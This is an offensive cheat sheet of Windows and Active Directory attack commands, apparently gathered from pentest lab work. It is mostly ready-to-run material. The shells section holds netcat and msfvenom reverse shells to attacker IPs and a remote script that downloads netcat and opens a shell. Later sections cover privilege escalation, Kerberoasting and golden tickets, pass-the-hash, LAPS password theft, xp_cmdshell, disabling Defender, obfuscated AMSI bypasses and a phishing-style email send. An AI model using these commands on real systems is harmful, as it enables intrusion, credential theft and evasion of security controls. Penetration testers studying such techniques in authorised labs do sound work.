# Windows-AD-attacking

&nbsp;

Any **useful commands** for **Windows** / **Active Directory** will be posted here :shield::hammer:

&nbsp;

* [Shells :hook:](#shells)
* [Transfer files :open_file_folder:](#transfer-files)
* [Privilege escalation :test_tube:](#privilege-escalation)
* [Kerberos :label:](#Kerberos)
* [Pass the hash :joystick:](#pass-the-hash)
* [Enumeration :mag:](#enumeration)
* [MSSQL :card_index:](#MSSQL)
* [LAPS :key:](#LAPS)
* [Security and policies :unlock:](#security-and-policies)
* [Misc commands :zap:](#misc-commands)

&nbsp;

## Shells

&nbsp;

:hook: Creating your reverse/bind shells

&nbsp;


**[+] Create reverse shell using msfvenom**

```powershell
// Meterpreter

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe

// TCP

msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe
```

&nbsp;

**[+] Reverse shell using NetCat**

```powershell
// In your Kali Linux machine:

nc -lnvp 443

// In the target's machine

nc.exe 192.168.13.37 443 -e cmd.exe
```

&nbsp;

**[+] Login by a specific user and get a shell using Netcat (Powershell)**

```powershell
$user = "hitman.corp\hitmanalharbi"
$pass = ConvertTo-SecureString -String "PASS123@!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $pass
Invoke-Command -ComputerName hitman-dc -Credential $cred -ScriptBlock {
	Invoke-WebRequest http://192.168.40.2/nc64.exe -OutFile C:\users\public\nc.exe;
	C:\users\public\nc.exe 192.168.40.2 443 -e cmd.exe
}
```


&nbsp;
&nbsp;

## Transfer files

&nbsp;

:open_file_folder: Transfering and sharing files over the network

&nbsp;


**[+] Upload file using Powershell**

```powershell
powershell.exe $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest http://192.168.50.48/ASREPRoast.ps1 -OutFile C:\users\hitman\ASREPRoast.ps1
```

&nbsp;

**[+] Upload file using certutil.exe**

```powershell
certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus.exe
```

&nbsp;

**[+] Transfer files using powershell session (PSSesion)**

```powershell
$sess = New-PSSession -ComputerName ufc-webprod -Credential usfun\pastudent1337
Copy-Item -Path Invoke-Mimikatz.ps1 -Destination C:\users\public\Invoke-Mimikatz.ps1 -ToSession $sess
// You can use -FromSession to get files from session :D
```

&nbsp;

**[+] Transfer files using rdesktop tool (Available in Kali Linux)**

```
// In Kali linux

mkdir /home/hitman/shared
rdesktop -f 192.168.50.48 -r disk:linux=/home/hitman/shared

// Now in Windows's RDP

Go to Network Places -> Entire Network -> Microsoft Terminal Services -> tsclient
and put your files there, you will find them in Kali too
Note: You can access the share \\tsclient directly too
```

&nbsp;

**[+] Transfer files using network shares (Powershell)**

```powershell
// You need to make a public share in your student's VM or your Kali

Copy-Item –Path \\PA-USER1337\scripts\nc64.exe –Destination 'C:\Users\jumpsrvadmin\Desktop\Diagnostics\nc.exe'
```

&nbsp;
&nbsp;

## Privilege escalation

&nbsp;

:test_tube: Escalating your privilege to the highest privileges 

&nbsp;


**[+] Privilege escalation using juicy potato when you have SeImpersonatePrivilege privilege (Sometimes you need to attach CLSID)**

```powershell
JuicyPotato.exe -l 13373 -p c:\windows\system32\cmd.exe -a "/c c:/users/public/reverse.exe" -t *
```

&nbsp;

**[+] PowerUp.ps1 "Good powershell script for windows privilege escalation"**

```powershell
C:> powershell.exe -nop -exec bypass

PS C:\> Import-Module PowerUp.ps1

PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```

&nbsp;

**[+] Weak service permissions privilege escalation**

```powershell
// For example "Victim" is your current username

C:\Users\victim\Desktop>accesschk64 -uwcqv "victim" *

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

RW SNMPTRAP
        SERVICE_ALL_ACCESS

// Check service

C:\Users\victim\Desktop>sc qc SNMPTRAP

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SNMPTRAP
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\snmptrap.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : SNMP Trap
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

// Change the binary path to your reverse shell or command

C:\Users\victim\Desktop>sc config SNMPTRAP binpath= "net localgroup administrators victim /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\victim\Desktop>sc config SNMPTRAP obj= ".\LocalSystem" password= ""

[SC] ChangeServiceConfig SUCCESS

// Stop and restart the service

C:\Users\victim\Desktop>sc start SNMPTRAP
```

&nbsp;

**[+] Search for unquoted service paths**

```powershell
// For exploitation check this article: https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

&nbsp;
&nbsp;

## Kerberos

&nbsp;

:label: Kerberos attacks like extract tickets and crack them or pass them

&nbsp;


**[+] Request a ticket for a specific SPN (powershell)**

```powershell
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLService/ufc-db1.us.funcorp.local"  
```

&nbsp;

**[+] Export all tickets using Mimikatz**

```powershell
mimikatz # kerberos::list /export  
```

&nbsp;

**[+] Crack a ticket using Tgsrepcrack.py (You can use john too or hashcat)**

```powershell
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.hitmanalharbi.local~1433-boo.LOCAL.kirbi  
```

&nbsp;

**[+] Export all kerberastbles users to John format (Need PowerView.ps1)**

```powershell
Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
```

&nbsp;

**[+] Kerberos Double-Hop problem (powershell)**

```powershell
$SecPassword = ConvertTo-SecureString 'YourSecretPassword1337' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('us.funcorp.local\pastudent1337', $SecPassword)
Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
    Invoke-Command -ComputerName UFC-WEBPROD -Credential $Using:cred -ScriptBlock {
		& cmd /c "hostname"    
    }
} 
```

&nbsp;

**[+] Create a golden ticket using Mimikatz**

```powershell
kerberos::golden /user:Hitman /domain:DOMAIN /sid:DOMAIN-SID /krbtgt:HASH /ticket:tgt /ptt
```

&nbsp;

**[+] Extract SPN/NTLM from keytab file (Linux)**

```bash
// https://github.com/sosdave/KeyTabExtract

└─# python3 keytabextract.py sql.keytab      
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[!] Unable to identify any AES256-CTS-HMAC-SHA1 hashes.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
        REALM : it.gcb.local
        SERVICE PRINCIPAL : sqlsvc/
        NTLM HASH : 7782dXXXXXXXXXXXXXXXXXXX :D
```

&nbsp;

**[+] Kerberos Resource-based Constrained Delegation (Need PowerMad and AD modules)**

```powershell
New-MachineAccount -Domain internal.msp.local -DomainController internal-dc01.internal.msp.local -MachineAccount attacker -Password (ConvertTo-SecureString 'Password123' -AsPlainText -Force) -Verbose
Set-ADComputer INTERNAL-BATCH -PrincipalsAllowedToDelegateToAccount attacker$ -Verbose
.\Rubeus.exe s4u /user:attacker$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/INTERNAL-BATCH /impersonateuser:Administrator /ptt
```

&nbsp;

**[+] DA to EA (Need Rubeus.exe)**

```powershell
kerberos::golden /domain:internal.msp.local /user:administrator /sid:S-1-5-21-2754435719-1041067879-922430489 /krbtgt:c5915aaXXXXXXXXX /sids:S-1-5-21-2998733414-582960673-4099777928-519 /ptt
```

&nbsp;
&nbsp;

## Pass the hash

&nbsp;

:joystick: Passing the hash for different services

&nbsp;


**[+] Pass the hash using pth-winexe (Available in Kali Linux)**

```powershell
pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE //IP cmd
```

&nbsp;

**[+] Access RDP using pass the hash (xfreerdp tool)**

```powershell
xfreerdp /u:username /pth:USER_NTLM_HERE /d:domain /v:IP
```

&nbsp;

**[+] Pass the hash using PsExec.py**

```powershell
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE anyuser@192.168.50.49
```

&nbsp;

**[+] Pass the hash using Mimikatz and run PowerShell**

```powershell
sekurlsa::pth /user:hitman /ntlm:4d8aa380635ded528e2cc8b0b96f3b06 /domain:hitman.corp /run:powershell.exe
```

&nbsp;
&nbsp;

## Enumeration

&nbsp;

:mag: Some commands about enumeration snd recon 

&nbsp;


**[+] Get information about the current domain (Need PowerView.ps1)**

```powershell
Get-NetDomain
```

&nbsp;


**[+] Get all users in the domain (Need PowerView.ps1)**

```powershell
Get-NetUser | select samaccountname
```

&nbsp;


**[+] Get all computers in the domain (Need PowerView.ps1)**

```powershell
Get-NetComputer | select samaccountname, operatingsystem
```

&nbsp;


**[+] Get current domain's information (Active directory module)**

```powershell
Get-ADDomain
```

&nbsp;


**[+] Get current domain's users (Active directory module)**

```powershell
Get-ADUser -Filter * | Select SamAccountName
```

&nbsp;


**[+] Get current domain's computers (Active directory module)**

```powershell
Get-AdComputer -Filter * | select Name
```

&nbsp;


**[+] Get current domain's groups (Active directory module)**

```powershell
Get-ADGroup -Filter * | select name
```

&nbsp;


**[+] Get specific group's members (Active directory module)**

```powershell
Get-ADGroupMember -Identity "Administrators" -Recursive
```

&nbsp;


**[+] Get users & computer with specific properties, my favorite way to enumerate :D (Active directory module)**

```powershell
// Get users and some properties like passwordlastset to know when it changed and the description

Get-ADUser -filter * -properties passwordlastset,description | ft Name, passwordlastset, Description

// Get computer ...

Get-ADComputer -filter * -properties passwordlastset,description | ft Name, passwordlastset, Description
```

&nbsp;


**[+] Search for local admin access (Need PowerView.ps1)**

```powershell
// Get all computers from specific domain

$computers = Get-NetComputer -Domain hitman.msp.local

// Use Invoke-Command to check if you can execute command on them

Invoke-Command -ErrorAction SilentlyContinue -ScriptBlock{ hostname } -Computer ($computers.dnshostName)
```

&nbsp;


**[+] enum SMB shares using smbclient (Smbclient available in Kali Linux)**

```powershell
smbclient -L IP
```

&nbsp;

**[+] Sharphound command (For bloodhound)**

```powershell
// EXE version

./SharpHound.exe --CollectionMethod All

// Powershell version

Invoke-BloodHound -CollectionMethod All
```

&nbsp;

**[+] Find interesting ACLs for specific user (Need PowerView.ps1)**

```powershell
Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
```

&nbsp;

**[+] Find all ACLs for specific computer/group/user's SID (Need PowerView.ps1)**

```powershell
Get-ObjectAcl -ResolveGUIDs -Domain internal.msp.local | ? {$_.SecurityIdentifier -like "S-1-5-21-2754435719-1041067879-922430489-1118"}
```

&nbsp;

**[+] Discover domain's computers have unconstrained delegation (Need PowerView.ps1)**

```powershell
Get-DomainComputer -UnConstrained | select samaccountname
```

&nbsp;

**[+] Enumerate users/computers have contrained delegation enabled (Need PowerView.ps1)**

```powershell
// Users

Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

// Computers

Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

&nbsp;

**[+] Get specific domain SID (Need PowerView.ps1)**

```powershell
Get-DomainSID -Domain funcorp.local
```

&nbsp;

**[+] Find interesting ACLs in another domain (Need PowerView.ps1)**

```powershell
Find-InterestingDomainAcl -Domain TrustedForest.corp
```

&nbsp;

**[+] Get AppLocker rules/policies (Powershell)**

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

&nbsp;

**[+] Displays a service's security descriptor (CMD)**

```powershell
// scmanager is the service's name, you can write any service 

sc sdshow scmanager
```

&nbsp;

**[+] 

Gets the capabilities of a specific user on a constrained session configuration (JEA)**

```powershell
Get-PSSessionCapability -ConfigurationName ITAccess -Username vanessa
```

&nbsp;
&nbsp;

## MSSQL

&nbsp;

:card_index: Some commands will help you in pentesting MSSQL

&nbsp;

**[+] Get list of sql servers on the domain (PowerUpSQL)**

```powershell
Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose 
```

&nbsp;

**[+] Execute a custom query (PowerUpSQL)**

```powershell
Get-SQLQuery -Instance AC-DBREPORT -Query "SELECT current_user"
```

&nbsp;

**[+] Execute a query to get the databases names (PowerUpSQL)**

```powershell
Get-SQLQuery -Instance msp-sqlreport -Query "SELECT name FROM master..sysdatabases;"
```

&nbsp;

**[+] Execute a query to get the tables from specific database (PowerUpSQL)**

```powershell
Get-SQLQuery -Instance msp-sqlreport -Query "SELECT name FROM DatabaseNameYouWant..sysobjects WHERE xtype = 'U';"
```

&nbsp;

**[+] Execute a query to get the linked servers (PowerUpSQL)**

```powershell
Get-SQLQuery -Instance msp-sqlreport -Query "exec sp_linkedservers;"
```

&nbsp;

**[+] Escalate the privileges (PowerUpSQL)**

```powershell
Invoke-SQLEscalatePriv -Verbose -Instance DBSERVER
```

&nbsp;

**[+] Crawl database links (PowerUpSQL)**

```powershell
Get-SqlServerLinkCrawl -Verbose -Instance UFC-SQLDEV
```

&nbsp;

**[+] Crawl database links and execute a custom query (PowerUpSQL)**

```powershell
 Get-SqlServerLinkCrawl -Verbose -Instance UFC-SQLDEV -Query "select current_user" 
```

&nbsp;

**[+] Enable XP_CMDSHELL (Any MSSQL client like HeidiSQL)**

```sql
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

&nbsp;
&nbsp;

## LAPS

&nbsp;

:key: Local Administrator Password Solution (LAPS) commands, please install LAPS module: https://github.com/ztrhgf/LAPS

&nbsp;

**[+] Identifying if LAPS is installed in the current computer (Powershell)**

```powershell
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
```

&nbsp;

**[+] Get domain's computers have LAPS (Need AD module)**

```powershell
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'}
```

&nbsp;

**[+] Enumerate OUs LAPS is in use and which group/users can read the passwords (Need LAPS module)**

```powershell
PS C:\Users\itemployee14\Desktop\PS modules> Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1
PS C:\Users\itemployee14\Desktop\PS modules> Find-AdmPwdExtendedRights -Identity *

Name                 DistinguishedName                                                 Status
----                 -----------------                                                 ------
Domain Controllers   OU=Domain Controllers,DC=gcb,DC=local                             Delegated
Domain Controllers   OU=Domain Controllers,DC=it,DC=gcb,DC=local                       Delegated
AppServers           OU=AppServers,DC=it,DC=gcb,DC=local                               Delegated
ITEmployees          OU=ITEmployees,DC=it,DC=gcb,DC=local                              Delegated
PreProd              OU=PreProd,DC=it,DC=gcb,DC=local                                  Delegated

PS C:\Users\itemployee14\Desktop\PS modules> Find-AdmPwdExtendedRights -Identity AppServers

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=AppServers,DC=it,DC=gcb,DC=local           {NT AUTHORITY\SYSTEM, IT\Domain Admins, IT\LocalAdmins}
```

&nbsp;

**[+] Get all domain's computer and check LAPS for passwords (Need AD & LAPs modules)**

```powershell
PS C:\Users\itemployee14\Desktop\PS modules> get-adcomputer -filter * | get-admpwdpassword

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
IT-DC                CN=IT-DC,OU=Domain Controllers,DC=it,DC=gc...                    1/1/0001 12:00:00 AM
IT-PREPROD           CN=IT-PREPROD,OU=PreProd,DC=it,DC=gcb,DC=l...                    1/1/0001 12:00:00 AM
IT-SQLSRV02          CN=IT-SQLSRV02,CN=Computers,DC=it,DC=gcb,D...                    1/1/0001 12:00:00 AM
IT-APPSRV01          CN=IT-APPSRV01,OU=AppServers,DC=it,DC=gcb,...                    6/27/2019 5:45:32 AM
IT-TRACK01           CN=IT-TRACK01,CN=Computers,DC=it,DC=gcb,DC...                    1/1/0001 12:00:00 AM
```

&nbsp;

**[+] Get password from LAPS for a specific machine (Need AD module)**

```powershell
 Get-ADComputer -Identity it-appsrv01 -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

&nbsp;
&nbsp;

## Security and policies

&nbsp;

:unlock: Bypass security, policies and AV evasion

&nbsp;


**[+] Bypass Powershell Execution Policy**

```powershell
// In Powershell you can write:

Set-ExecutionPolicy -ExecutionPolicy bypass

// or run powershell like this:

powershell.exe -ep bypass
```

&nbsp;

**[+] Disable windows defender**

```powershell
// Registry 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1

// Powershell

powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
```


&nbsp;

**[+] Powershell AMSI bypass**

```powershell
// Try this

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

// Or you can try this

[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
```

&nbsp;

**[+] Bypass "Dot sourcing is not allowed" in PowerShell**

```powershell
// Write the call/code in a file

'Import-Module C:\allowedPath\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command "privilege::debug token::elevate" ' | Out-File -FilePath run.ps1

// Run file directly without dot source

.\run.ps1
```

&nbsp;
&nbsp;

## Misc commands

&nbsp;

:zap: Any misc or general command will be here

&nbsp;


**[+] Enable RDP and allow it in the firewall too**

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

&nbsp;


**[+] Port forwarding**

```powershell
netsh interface portproxy add v4tov4 listenport=2525 listenaddress=192.168.50.48 connectport=25 connectaddress=192.168.21.55
netsh advfirewall firewall add rule name=smtpfrwd dir=in action=allow protocol=TCP localport=2525
```

&nbsp;

**[+] Recursive files search (Powershell)**

```powershell
// Search for all txt files

Get-ChildItem -Path C:\ -Filter  *.txt -Recurse -ErrorAction SilentlyContinue -Force

// Search for flag.txt

Get-ChildItem -Path C:\ -Filter  flag.txt -Recurse -ErrorAction SilentlyContinue -Force
```

&nbsp;

**[+] Search for files in a specific date range (Powershell)**

```powershell
// If you want to search for folders or files without extensions, please remove (-include *.*)

Get-ChildItem -erroraction 'silentlycontinue' -recurse -include *.* -path C:\Users | ? {$_.lastwritetime -gt '10/10/2020' -AND $_.lastwritetime -lt '11/11/2020'}
```

&nbsp;

**[+] Encode and decode a file (Base64)**

```powershell
// Encode a file to base64

certutil -encode mail.exe encoded.txt

// Decode a base64 file

certutil -decode encoded.txt mail.exe
```

&nbsp;

**[+] Send a message with attachments (Powershell)**

```powershell
Send-MailMessage -From "user<user@domain.com>" -To "lbunce<lbunce@amazecorp.local>" -Subject "Check the important doc please" -SmtpServer 192.168.21.55 -Attachments .\doc.chm
```

&nbsp;

**[+] Get group or user by SID (Need AD module)**

```powershell
// AD Group 

Get-ADGroup -Identity S-1-5-21-948911695-1962824894-4291460450-1124

// AD Username

Get-ADUser -Identity S-1-5-21-948911695-1962824894-4291460450-26105
```

&nbsp;

**[+] Add a domain computer to different domain group (Need AD module)**

```powershell
// Group name and specify the domain

$group = Get-ADGroup -Identity 'DatabaseOwners' -Server 'alharbi.corp'

// Computer name and specify the domain ( You can change it to user by using "Get-ADUser")

$pc = Get-ADComputer -Identity 'hitman-pc01$' -Server 'hitman.corp'

// Add the computer to the group :D

Add-ADGroupMember -Identity $group -Members $pc
```


&nbsp;

**[+] Unzip compressed file (PowerShell)**

```powershell
Expand-Archive -Force ad.zip C:\users\public\ad
```


&nbsp;

**[+] Sniff network packets (PowerShell)**

```powershell
// Download the sniffer.ps1 from https://raw.githubusercontent.com/sperner/PowerShell/master/Sniffer.ps1

./sniffer.ps1 -LocalIP 192.168.4.111  -ScanIP 192.168.42.14 -Protocol tcp
```

&nbsp;
&nbsp;
